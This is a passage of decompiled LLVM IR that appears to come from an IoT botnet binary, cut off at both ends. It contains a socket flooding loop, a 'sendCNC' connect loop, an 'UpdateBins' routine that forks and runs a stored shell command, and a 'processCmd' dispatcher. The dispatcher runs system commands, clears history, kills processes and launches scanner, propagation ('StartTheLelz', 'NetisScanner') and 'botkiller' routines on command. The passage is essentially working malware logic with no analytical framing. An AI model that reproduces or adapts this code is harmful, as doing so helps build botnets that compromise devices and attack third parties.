  %v2_100082d4 = ptrtoint i32* %stack_var_-3192 to i32
  store i32 268468968, i32* @lr, align 4
  %v0_100082e4 = call i32 @random()
  %v2_10008300 = srem i32 %v0_100082e4, 674
  %v1_1000831c = mul nsw i32 %v2_10008300, 4
  %v2_10008324 = add i32 %v2_100082d4, 12
  %v1_10008328 = add i32 %v2_10008324, %v1_1000831c
  %v1_1000832c = inttoptr i32 %v1_10008328 to i32*
  %v2_1000832c = load i32, i32* %v1_1000832c, align 4
  %v2_10008330 = ptrtoint i32* %stack_var_-572 to i32
  store i32 %v2_10008330, i32* @r3, align 4
  %v0_10008348 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10008358.700 to i32), i32* @lr, align 4
  %v9_10008354 = call i32 @sprintf(i32 %v2_10008330, i32 ptrtoint ([62 x i8]* @global_var_1001bb88.699 to i32), i32 %arg2, i32 %arg4, i32 %v0_10008348, i32 %v2_1000832c, i32 268566528, i32 %v2_10008300)
  %v2_100084048 = icmp sgt i32 %arg6, 0
  br i1 %v2_100084048, label %dec_label_pc_10008364.lr.ph, label %dec_label_pc_1000840c

dec_label_pc_10008364.lr.ph:                      ; preds = %entry
  br label %dec_label_pc_10008364

dec_label_pc_10008364:                            ; preds = %dec_label_pc_10008364.lr.ph, %dec_label_pc_100083f0
  %storemerge311 = phi i32 [ 0, %dec_label_pc_10008364.lr.ph ], [ %v1_100083f4, %dec_label_pc_100083f0 ]
  store i32 268469096, i32* @lr, align 4
  %v0_10008364 = call i32 @__libc_fork()
  %v3_1000836c = icmp eq i32 %v0_10008364, 0
  br i1 %v3_1000836c, label %dec_label_pc_100083f0, label %dec_label_pc_100083d0.preheader

dec_label_pc_100083d0.preheader:                  ; preds = %dec_label_pc_10008364
  store i32 268469208, i32* @lr, align 4
  %v1_100083d44 = call i32 @__GI_time(i32 0)
  %v2_100083e05 = icmp slt i32 %v1_100083d44, %v2_1000828c
  br i1 %v2_100083e05, label %dec_label_pc_10008378, label %dec_label_pc_100083e8

dec_label_pc_10008378:                            ; preds = %dec_label_pc_100083d0.preheader, %dec_label_pc_100083d0.backedge
  %v3_1000838c = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  store i32 %v3_1000838c, i32* %stack_var_-3192, align 4
  %v3_1000839c = icmp eq i32 %v3_1000838c, 0
  br i1 %v3_1000839c, label %dec_label_pc_100083d0.backedge, label %dec_label_pc_100083a4

dec_label_pc_100083a4:                            ; preds = %dec_label_pc_10008378
  store i32 %v2_10008330, i32* @r3, align 4
  %v0_100083ac = call i32 @__GI_strlen()
  %v3_100083b8 = load i32, i32* %stack_var_-3192, align 4
  store i32 268469192, i32* @lr, align 4
  %v2_100083c4 = call i32 @__libc_write(i32 %v3_100083b8, i32 %v2_10008330)
  %v3_100083c8 = load i32, i32* %stack_var_-3192, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100083d0.701 to i32), i32* @lr, align 4
  %v1_100083cc = call i32 @__libc_close(i32 %v3_100083c8)
  br label %dec_label_pc_100083d0.backedge

dec_label_pc_100083d0.backedge:                   ; preds = %dec_label_pc_100083a4, %dec_label_pc_10008378
  store i32 268469208, i32* @lr, align 4
  %v1_100083d4 = call i32 @__GI_time(i32 0)
  %v2_100083e0 = icmp slt i32 %v1_100083d4, %v2_1000828c
  br i1 %v2_100083e0, label %dec_label_pc_10008378, label %dec_label_pc_100083e8

dec_label_pc_100083e8:                            ; preds = %dec_label_pc_100083d0.backedge, %dec_label_pc_100083d0.preheader
  %v1_100083ec = call i32 @__GI__exit(i32 1)
  br label %dec_label_pc_100083f0

dec_label_pc_100083f0:                            ; preds = %dec_label_pc_10008364, %dec_label_pc_100083e8
  %v0_1000842413 = phi i32 [ 0, %dec_label_pc_10008364 ], [ %v1_100083ec, %dec_label_pc_100083e8 ]
  %v1_100083f4 = add nuw nsw i32 %storemerge311, 1
  %v2_10008404 = icmp slt i32 %v1_100083f4, %arg6
  br i1 %v2_10008404, label %dec_label_pc_10008364, label %dec_label_pc_1000840c

dec_label_pc_1000840c:                            ; preds = %dec_label_pc_100083f0, %entry
  %v0_10008424 = phi i32 [ %v9_10008354, %entry ], [ %v0_1000842413, %dec_label_pc_100083f0 ]
  ret i32 %v0_10008424

; uselistorder directives
  uselistorder i32 %v2_10008330, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1000828c, { 1, 0 }
  uselistorder i32 268469208, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_100083f0, { 1, 0 }
  uselistorder label %dec_label_pc_10008378, { 1, 0 }
  uselistorder label %dec_label_pc_10008364, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  store i32 268469328, i32* @lr, align 4
  %v1_1000844c = call i32 @__GI_time(i32 0)
  %v2_10008458 = add i32 %v1_1000844c, %arg3
  store i32 268469356, i32* @lr, align 4
  %v1_10008468 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-48, align 4
  %v1_10008480 = urem i32 %arg2, 65536
  store i32 %v1_10008480, i32* @r3, align 4
  %v1_10008488 = call i32 @htons(i32 %v1_10008480)
  store i32 268469468, i32* @lr, align 4
  %v1_100084d81 = call i32 @__GI_time(i32 0)
  %v2_100084e42 = icmp slt i32 %v1_100084d81, %v2_10008458
  br i1 %v2_100084e42, label %dec_label_pc_10008498.lr.ph, label %dec_label_pc_100084ec

dec_label_pc_10008498.lr.ph:                      ; preds = %entry
  %v2_100084b0 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_10008498

dec_label_pc_10008498:                            ; preds = %dec_label_pc_10008498.lr.ph, %dec_label_pc_10008498
  store i32 268469416, i32* @lr, align 4
  %v3_100084a4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_100084c4.702 to i32), i32* @lr, align 4
  %v3_100084c0 = call i32 @__libc_connect(i32 %v3_100084a4, i32 %v2_100084b0, i32 16)
  store i32 268469452, i32* @lr, align 4
  %v1_100084c8 = call i32 @sleep(i32 1)
  store i32 ptrtoint ([3 x i8]* @global_var_100084d4.703 to i32), i32* @lr, align 4
  %v1_100084d0 = call i32 @__libc_close(i32 %v3_100084a4)
  store i32 268469468, i32* @lr, align 4
  %v1_100084d8 = call i32 @__GI_time(i32 0)
  %v2_100084e4 = icmp slt i32 %v1_100084d8, %v2_10008458
  br i1 %v2_100084e4, label %dec_label_pc_10008498, label %dec_label_pc_100084ec

dec_label_pc_100084ec:                            ; preds = %dec_label_pc_10008498, %entry
  %v1_100084d8.lcssa = phi i32 [ %v1_100084d81, %entry ], [ %v1_100084d8, %dec_label_pc_10008498 ]
  ret i32 %v1_100084d8.lcssa

; uselistorder directives
  uselistorder i32 %v1_10008480, { 1, 0 }
  uselistorder i32 %v2_10008458, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 268469468, { 1, 0 }
  uselistorder label %dec_label_pc_10008498, { 1, 0 }
}

define i32 @UpdateBins(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10008504 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10008504, i32* %stack_var_-32, align 4
  %v5_10008504 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v5_10008504, i32* @r31, align 4
  store i32 268469532, i32* @lr, align 4
  %v0_10008518 = call i32 @__libc_fork()
  %v3_10008528 = icmp eq i32 %v0_10008518, 0
  br i1 %v3_10008528, label %dec_label_pc_10008530, label %dec_label_pc_10008548

dec_label_pc_10008530:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_1000853c.705 to i32), i32* @lr, align 4
  %v2_10008538 = call i32 @__libc_system(i32 ptrtoint ([439 x i8]* @global_var_1001bbc8.704 to i32))
  store i32 ptrtoint (i32* @global_var_10008544.706 to i32), i32* @lr, align 4
  %v1_10008540 = call i32 @sleep(i32 20)
  br label %dec_label_pc_1000855c

dec_label_pc_10008548:                            ; preds = %entry
  %v4_10008558 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001bd80.707, i32 0, i32 0), i32 %v0_10008518)
  br label %dec_label_pc_1000855c

dec_label_pc_1000855c:                            ; preds = %dec_label_pc_10008530, %dec_label_pc_10008548
  %storemerge = phi i32 [ %v4_10008558, %dec_label_pc_10008548 ], [ %v1_10008540, %dec_label_pc_10008530 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_1000855c, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10008574 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10008574, i32* %stack_var_-224, align 4
  %v5_10008574 = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v5_10008574, i32* @r31, align 4
  %v2_100085a8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001bd84.708 to i32), i32* @r4, align 4
  %v3_100085b8 = inttoptr i32 %v2_100085a8 to i8*
  %v4_100085b8 = call i32 @__GI_strcoll(i8* %v3_100085b8, i32 ptrtoint ([7 x i8]* @global_var_1001bd84.708 to i32))
  %v3_100085c0 = icmp eq i32 %v4_100085b8, 0
  br i1 %v3_100085c0, label %dec_label_pc_100085c8, label %dec_label_pc_10008718

dec_label_pc_100085c8:                            ; preds = %entry
  %v1_100085cc = add i32 %tmp, 4
  %v1_100085d0 = inttoptr i32 %v1_100085cc to i32*
  %v2_100085d0 = load i32, i32* %v1_100085d0, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001bd8c.709 to i32), i32* @r4, align 4
  %v3_100085e0 = inttoptr i32 %v2_100085d0 to i8*
  %v4_100085e0 = call i32 @__GI_strcoll(i8* %v3_100085e0, i32 ptrtoint ([8 x i8]* @global_var_1001bd8c.709 to i32))
  %v3_100085e8 = icmp eq i32 %v4_100085e0, 0
  br i1 %v3_100085e8, label %dec_label_pc_100085f0, label %dec_label_pc_1000861c

dec_label_pc_100085f0:                            ; preds = %dec_label_pc_100085c8
  store i32 268469756, i32* @lr, align 4
  %v2_100085f8 = call i32 @__libc_system(i32 ptrtoint ([130 x i8]* @global_var_1001bd94.710 to i32))
  store i32 268469760, i32* @lr, align 4
  %v1_100085fc = call i32 @ClearHistory(i32 %v2_100085f8)
  %v3_10008604 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 268469788, i32* @lr, align 4
  %v4_10008618 = call i32 @sockprintf(i32 %v3_10008604, i32 ptrtoint ([26 x i8]* @global_var_1001be18.711 to i32), i32 268566528)
  br label %dec_label_pc_1000861c

dec_label_pc_1000861c:                            ; preds = %dec_label_pc_100085c8, %dec_label_pc_100085f0
  %v2_10008624 = load i32, i32* %v1_100085d0, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001be34.712 to i32), i32* @r4, align 4
  %v3_10008634 = inttoptr i32 %v2_10008624 to i8*
  %v4_10008634 = call i32 @__GI_strcoll(i8* %v3_10008634, i32 ptrtoint ([7 x i8]* @global_var_1001be34.712 to i32))
  %v3_1000863c = icmp eq i32 %v4_10008634, 0
  br i1 %v3_1000863c, label %dec_label_pc_10008644, label %dec_label_pc_10008670

dec_label_pc_10008644:                            ; preds = %dec_label_pc_1000861c
  store i32 268469840, i32* @lr, align 4
  %v2_1000864c = call i32 @__libc_system(i32 ptrtoint ([47 x i8]* @global_var_1001be3c.713 to i32))
  store i32 268469844, i32* @lr, align 4
  %v1_10008650 = call i32 @ClearHistory(i32 %v2_1000864c)
  %v3_10008658 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 268469872, i32* @lr, align 4
  %v4_1000866c = call i32 @sockprintf(i32 %v3_10008658, i32 ptrtoint ([24 x i8]* @global_var_1001be6c.714 to i32), i32 268566528)
  br label %dec_label_pc_10008670

dec_label_pc_10008670:                            ; preds = %dec_label_pc_1000861c, %dec_label_pc_10008644
  %v2_10008678 = load i32, i32* %v1_100085d0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001be84.715 to i32), i32* @r4, align 4
  %v3_10008688 = inttoptr i32 %v2_10008678 to i8*
  %v4_10008688 = call i32 @__GI_strcoll(i8* %v3_10008688, i32 ptrtoint ([4 x i8]* @global_var_1001be84.715 to i32))
  %v3_10008690 = icmp eq i32 %v4_10008688, 0
  br i1 %v3_10008690, label %dec_label_pc_10008698, label %dec_label_pc_100086c4

dec_label_pc_10008698:                            ; preds = %dec_label_pc_10008670
  store i32 268469924, i32* @lr, align 4
  %v2_100086a0 = call i32 @__libc_system(i32 ptrtoint ([31 x i8]* @global_var_1001be88.716 to i32))
  store i32 268469928, i32* @lr, align 4
  %v1_100086a4 = call i32 @ClearHistory(i32 %v2_100086a0)
  %v3_100086ac = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 268469956, i32* @lr, align 4
  %v4_100086c0 = call i32 @sockprintf(i32 %v3_100086ac, i32 ptrtoint ([24 x i8]* @global_var_1001bea8.717 to i32), i32 268566528)
  br label %dec_label_pc_100086c4

dec_label_pc_100086c4:                            ; preds = %dec_label_pc_10008670, %dec_label_pc_10008698
  %v2_100086cc = load i32, i32* %v1_100085d0, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1001bec0.718 to i32), i32* @r4, align 4
  %v3_100086dc = inttoptr i32 %v2_100086cc to i8*
  %v4_100086dc = call i32 @__GI_strcoll(i8* %v3_100086dc, i32 ptrtoint ([6 x i8]* @global_var_1001bec0.718 to i32))
  %v3_100086e4 = icmp eq i32 %v4_100086dc, 0
  br i1 %v3_100086e4, label %dec_label_pc_100086ec, label %dec_label_pc_10008718

dec_label_pc_100086ec:                            ; preds = %dec_label_pc_100086c4
  store i32 268470008, i32* @lr, align 4
  %v2_100086f4 = call i32 @__libc_system(i32 ptrtoint ([40 x i8]* @global_var_1001bec8.719 to i32))
  store i32 268470012, i32* @lr, align 4
  %v1_100086f8 = call i32 @ClearHistory(i32 %v2_100086f4)
  %v3_10008700 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 268470040, i32* @lr, align 4
  %v4_10008714 = call i32 @sockprintf(i32 %v3_10008700, i32 ptrtoint ([28 x i8]* @global_var_1001bef0.720 to i32), i32 268566528)
  br label %dec_label_pc_10008718

dec_label_pc_10008718:                            ; preds = %dec_label_pc_100086c4, %entry, %dec_label_pc_100086ec
  %v2_1000871c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10013cbc.32 to i32), i32* @r4, align 4
  %v3_1000872c = inttoptr i32 %v2_1000871c to i8*
  %v4_1000872c = call i32 @__GI_strcoll(i8* %v3_1000872c, i32 ptrtoint ([5 x i8]* @global_var_10013cbc.32 to i32))
  %v3_10008734 = icmp eq i32 %v4_1000872c, 0
  br i1 %v3_10008734, label %dec_label_pc_1000873c, label %dec_label_pc_1000875c

dec_label_pc_1000873c:                            ; preds = %dec_label_pc_10008718
  %v3_10008740 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint (i32* @global_var_10008758.722 to i32), i32* @lr, align 4
  %v4_10008754 = call i32 @sockprintf(i32 %v3_10008740, i32 ptrtoint ([6 x i8]* @global_var_1001bf0c.721 to i32), i32 268566528)
  br label %dec_label_pc_100098fc

dec_label_pc_1000875c:                            ; preds = %dec_label_pc_10008718
  %v2_10008760 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1001bf14.723 to i32), i32* @r4, align 4
  %v3_10008770 = inttoptr i32 %v2_10008760 to i8*
  %v4_10008770 = call i32 @__GI_strcoll(i8* %v3_10008770, i32 ptrtoint ([6 x i8]* @global_var_1001bf14.723 to i32))
  %v3_10008778 = icmp eq i32 %v4_10008770, 0
  br i1 %v3_10008778, label %dec_label_pc_10008780, label %dec_label_pc_100087ac

dec_label_pc_10008780:                            ; preds = %dec_label_pc_1000875c
  %v3_10008784 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 268470156, i32* @lr, align 4
  %v1_10008788 = call i32 @getdtablesize(i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  store i32 ptrtoint (i32* @global_var_100087a8.725 to i32), i32* @lr, align 4
  %v5_100087a4 = call i32 @sockprintf(i32 %v3_10008784, i32 ptrtoint ([3 x i8]* @global_var_1001bf1c.724 to i32), i32 %v1_10008788)
  br label %dec_label_pc_100098fc

dec_label_pc_100087ac:                            ; preds = %dec_label_pc_1000875c
  %v2_100087b0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001be34.712 to i32), i32* @r4, align 4
  %v3_100087c0 = inttoptr i32 %v2_100087b0 to i8*
  %v4_100087c0 = call i32 @__GI_strcoll(i8* %v3_100087c0, i32 ptrtoint ([7 x i8]* @global_var_1001be34.712 to i32))
  %v3_100087c8 = icmp eq i32 %v4_100087c0, 0
  br i1 %v3_100087c8, label %dec_label_pc_100087d0, label %dec_label_pc_100087fc

dec_label_pc_100087d0:                            ; preds = %dec_label_pc_100087ac
  %v3_100087d4 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100087ec.727 to i32), i32* @lr, align 4
  %v4_100087e8 = call i32 @sockprintf(i32 %v3_100087d4, i32 ptrtoint ([25 x i8]* @global_var_1001bf20.726 to i32), i32 268566528)
  store i32 ptrtoint (i32* @global_var_100087f8.728 to i32), i32* @lr, align 4
  %v1_100087f4 = call i32 @UpdateBins(i32 1)
  br label %dec_label_pc_100098fc

dec_label_pc_100087fc:                            ; preds = %dec_label_pc_100087ac
  %v2_10008800 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001bf3c.729 to i32), i32* @r4, align 4
  %v3_10008810 = inttoptr i32 %v2_10008800 to i8*
  %v4_10008810 = call i32 @__GI_strcoll(i8* %v3_10008810, i32 ptrtoint ([8 x i8]* @global_var_1001bf3c.729 to i32))
  %v3_10008818 = icmp eq i32 %v4_10008810, 0
  br i1 %v3_10008818, label %dec_label_pc_10008820, label %dec_label_pc_10008964

dec_label_pc_10008820:                            ; preds = %dec_label_pc_100087fc
  %v1_10008824 = add i32 %tmp, 4
  %v1_10008828 = inttoptr i32 %v1_10008824 to i32*
  %v2_10008828 = load i32, i32* %v1_10008828, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001be84.715 to i32), i32* @r4, align 4
  %v3_10008838 = inttoptr i32 %v2_10008828 to i8*
  %v4_10008838 = call i32 @__GI_strcoll(i8* %v3_10008838, i32 ptrtoint ([4 x i8]* @global_var_1001be84.715 to i32))
  %v3_10008840 = icmp eq i32 %v4_10008838, 0
  br i1 %v3_10008840, label %dec_label_pc_10008848, label %dec_label_pc_10008894

dec_label_pc_10008848:                            ; preds = %dec_label_pc_10008820
  %v3_1000884c = load i32, i32* @global_var_1002e618.730, align 4
  %v3_10008850 = icmp eq i32 %v3_1000884c, 0
  br i1 %v3_10008850, label %dec_label_pc_100098fc, label %dec_label_pc_10008858

dec_label_pc_10008858:                            ; preds = %dec_label_pc_10008848
  store i32 268470380, i32* @lr, align 4
  %v2_10008868 = call i32 @kill(i32 %v3_1000884c, i32 9)
  %v3_10008870 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 268470408, i32* @lr, align 4
  %v4_10008884 = call i32 @sockprintf(i32 %v3_10008870, i32 ptrtoint ([17 x i8]* @global_var_1001bf44.731 to i32), i32 268566528)
  store i32 0, i32* @global_var_1002e618.730, align 4
  br label %dec_label_pc_10008894

dec_label_pc_10008894:                            ; preds = %dec_label_pc_10008820, %dec_label_pc_10008858
  %v2_1000889c = load i32, i32* %v1_10008828, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001bf58.732 to i32), i32* @r4, align 4
  %v3_100088ac = inttoptr i32 %v2_1000889c to i8*
  %v4_100088ac = call i32 @__GI_strcoll(i8* %v3_100088ac, i32 ptrtoint ([3 x i8]* @global_var_1001bf58.732 to i32))
  %v3_100088b4 = icmp eq i32 %v4_100088ac, 0
  br i1 %v3_100088b4, label %dec_label_pc_100088bc, label %dec_label_pc_10008964

dec_label_pc_100088bc:                            ; preds = %dec_label_pc_10008894
  %v3_100088c0 = load i32, i32* @global_var_1002e618.730, align 4
  %v3_100088c4 = icmp eq i32 %v3_100088c0, 0
  br i1 %v3_100088c4, label %dec_label_pc_100088cc, label %dec_label_pc_100098fc

dec_label_pc_100088cc:                            ; preds = %dec_label_pc_100088bc
  store i32 268470480, i32* @lr, align 4
  %v0_100088cc = call i32 @__libc_fork()
  %v3_100088ec = icmp eq i32 %v0_100088cc, 0
  br i1 %v3_100088ec, label %dec_label_pc_10008904, label %dec_label_pc_100088f4

dec_label_pc_100088f4:                            ; preds = %dec_label_pc_100088cc
  store i32 %v0_100088cc, i32* @global_var_1002e618.730, align 4
  br label %dec_label_pc_100098fc

dec_label_pc_10008904:                            ; preds = %dec_label_pc_100088cc
  %v3_10008920 = load i32, i32* @global_var_1002e610.172, align 4
  store i32 %v3_10008920, i32* %stack_var_-80, align 4
  store i32 268470580, i32* @lr, align 4
  %v3_10008930 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_10008938 = load i32, i32* @r29, align 4
  store i32 268470608, i32* @lr, align 4
  %v5_1000894c = call i32 @sockprintf(i32 %v0_10008938, i32 ptrtoint ([26 x i8]* @global_var_1001bf5c.733 to i32), i32 %v3_10008930)
  %v2_10008958 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_10008960 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10008964

dec_label_pc_10008964:                            ; preds = %dec_label_pc_10008894, %dec_label_pc_100087fc, %dec_label_pc_10008904
  %v2_10008968 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1001bf78.735 to i32), i32* @r4, align 4
  %v3_10008978 = inttoptr i32 %v2_10008968 to i8*
  %v4_10008978 = call i32 @__GI_strcoll(i8* %v3_10008978, i32 ptrtoint ([6 x i8]* @global_var_1001bf78.735 to i32))
  %v3_10008980 = icmp eq i32 %v4_10008978, 0
  br i1 %v3_10008980, label %dec_label_pc_10008988, label %dec_label_pc_10008ad4

dec_label_pc_10008988:                            ; preds = %dec_label_pc_10008964
  %v1_1000898c = add i32 %tmp, 4
  %v1_10008990 = inttoptr i32 %v1_1000898c to i32*
  %v2_10008990 = load i32, i32* %v1_10008990, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001be84.715 to i32), i32* @r4, align 4
  %v3_100089a0 = inttoptr i32 %v2_10008990 to i8*
  %v4_100089a0 = call i32 @__GI_strcoll(i8* %v3_100089a0, i32 ptrtoint ([4 x i8]* @global_var_1001be84.715 to i32))
  %v3_100089a8 = icmp eq i32 %v4_100089a0, 0
  br i1 %v3_100089a8, label %dec_label_pc_100089b0, label %dec_label_pc_10008a1c

dec_label_pc_100089b0:                            ; preds = %dec_label_pc_10008988
  %v3_100089b4 = load i32, i32* @global_var_1002e618.730, align 4
  %v3_100089b8 = icmp eq i32 %v3_100089b4, 0
  br i1 %v3_100089b8, label %dec_label_pc_100098fc, label %dec_label_pc_100089c0

dec_label_pc_100089c0:                            ; preds = %dec_label_pc_100089b0
  store i32 268470740, i32* @lr, align 4
  %v2_100089d0 = call i32 @kill(i32 %v3_100089b4, i32 9)
  %v3_100089e0 = load i32, i32* @global_var_1002e610.172, align 4
  store i32 %v3_100089e0, i32* %stack_var_-80, align 4
  store i32 268470772, i32* @lr, align 4
  %v3_100089f0 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_100089f8 = load i32, i32* @r29, align 4
  store i32 268470800, i32* @lr, align 4
  %v5_10008a0c = call i32 @sockprintf(i32 %v0_100089f8, i32 ptrtoint ([23 x i8]* @global_var_1001bf80.736 to i32), i32 %v3_100089f0)
  store i32 0, i32* @global_var_1002e618.730, align 4
  br label %dec_label_pc_10008a1c

dec_label_pc_10008a1c:                            ; preds = %dec_label_pc_10008988, %dec_label_pc_100089c0
  %v2_10008a24 = load i32, i32* %v1_10008990, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001bf58.732 to i32), i32* @r4, align 4
  %v3_10008a34 = inttoptr i32 %v2_10008a24 to i8*
  %v4_10008a34 = call i32 @__GI_strcoll(i8* %v3_10008a34, i32 ptrtoint ([3 x i8]* @global_var_1001bf58.732 to i32))
  %v3_10008a3c = icmp eq i32 %v4_10008a34, 0
  br i1 %v3_10008a3c, label %dec_label_pc_10008a44, label %dec_label_pc_10008ad4

dec_label_pc_10008a44:                            ; preds = %dec_label_pc_10008a1c
  %v3_10008a48 = load i32, i32* @global_var_1002e618.730, align 4
  %v3_10008a4c = icmp eq i32 %v3_10008a48, 0
  br i1 %v3_10008a4c, label %dec_label_pc_10008a54, label %dec_label_pc_100098fc

dec_label_pc_10008a54:                            ; preds = %dec_label_pc_10008a44
  store i32 268470872, i32* @lr, align 4
  %v0_10008a54 = call i32 @__libc_fork()
  %v3_10008a64 = icmp eq i32 %v0_10008a54, 0
  br i1 %v3_10008a64, label %dec_label_pc_10008a7c, label %dec_label_pc_10008a6c

dec_label_pc_10008a6c:                            ; preds = %dec_label_pc_10008a54
  store i32 %v0_10008a54, i32* @global_var_1002e618.730, align 4
  br label %dec_label_pc_100098fc

dec_label_pc_10008a7c:                            ; preds = %dec_label_pc_10008a54
  %v3_10008a98 = load i32, i32* @global_var_1002e610.172, align 4
  store i32 %v3_10008a98, i32* %stack_var_-80, align 4
  store i32 268470956, i32* @lr, align 4
  %v3_10008aa8 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_10008ab0 = load i32, i32* @r29, align 4
  store i32 268470984, i32* @lr, align 4
  %v5_10008ac4 = call i32 @sockprintf(i32 %v0_10008ab0, i32 ptrtoint ([23 x i8]* @global_var_1001bf98.737 to i32), i32 %v3_10008aa8)
  %v1_10008ac8 = call i32 @NetisScanner(i32 %v5_10008ac4)
  %v1_10008ad0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10008ad4

dec_label_pc_10008ad4:                            ; preds = %dec_label_pc_10008a1c, %dec_label_pc_10008964, %dec_label_pc_10008a7c
  %v2_10008ad8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001bfb0.739 to i32), i32* @r4, align 4
  %v3_10008ae8 = inttoptr i32 %v2_10008ad8 to i8*
  %v4_10008ae8 = call i32 @__GI_strcoll(i8* %v3_10008ae8, i32 ptrtoint ([8 x i8]* @global_var_1001bfb0.739 to i32))
  %v3_10008af0 = icmp eq i32 %v4_10008ae8, 0
  br i1 %v3_10008af0, label %dec_label_pc_10008af8, label %dec_label_pc_10008b50

dec_label_pc_10008af8:                            ; preds = %dec_label_pc_10008ad4
  store i32 268471036, i32* @lr, align 4
  %v0_10008af8 = call i32 @listFork()
  %v3_10008b00 = icmp eq i32 %v0_10008af8, 0
  br i1 %v3_10008b00, label %dec_label_pc_10008b08, label %dec_label_pc_10008b50

dec_label_pc_10008b08:                            ; preds = %dec_label_pc_10008af8
  %v3_10008b14 = load i32, i32* @global_var_1002e610.172, align 4
  store i32 %v3_10008b14, i32* %stack_var_-80, align 4
  store i32 268471080, i32* @lr, align 4
  %v3_10008b24 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_10008b2c = load i32, i32* @r29, align 4
  store i32 268471108, i32* @lr, align 4
  %v5_10008b40 = call i32 @sockprintf(i32 %v0_10008b2c, i32 ptrtoint ([29 x i8]* @global_var_1001bfb8.740 to i32), i32 %v3_10008b24)
  %v1_10008b44 = call i32 @botkiller(i32 %v5_10008b40)
  %v1_10008b4c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10008b50

dec_label_pc_10008b50:                            ; preds = %dec_label_pc_10008af8, %dec_label_pc_10008ad4, %dec_label_pc_10008b08
  %v2_10008b54 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1001bfd8.742 to i32), i32* @r4, align 4
  %v3_10008b64 = inttoptr i32 %v2_10008b54 to i8*
  %v4_10008b64 = call i32 @__GI_strcoll(i8* %v3_10008b64, i32 ptrtoint ([12 x i8]* @global_var_1001bfd8.742 to i32))
  %v3_10008b6c = icmp eq i32 %v4_10008b64, 0
  br i1 %v3_10008b6c, label %dec_label_pc_10008b74, label %dec_label_pc_10008bb4

dec_label_pc_10008b74:                            ; preds = %dec_label_pc_10008b50
  %v3_10008b80 = load i32, i32* @global_var_1002e610.172, align 4
  store i32 %v3_10008b80, i32* %stack_var_-80, align 4
  store i32 268471188, i32* @lr, align 4
  %v3_10008b90 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_10008b98 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10008bb0.744 to i32), i32* @lr, align 4
  %v5_10008bac = call i32 @sockprintf(i32 %v0_10008b98, i32 ptrtoint ([17 x i8]* @global_var_1001bfe4.743 to i32), i32 %v3_10008b90)
  br label %dec_label_pc_100098fc

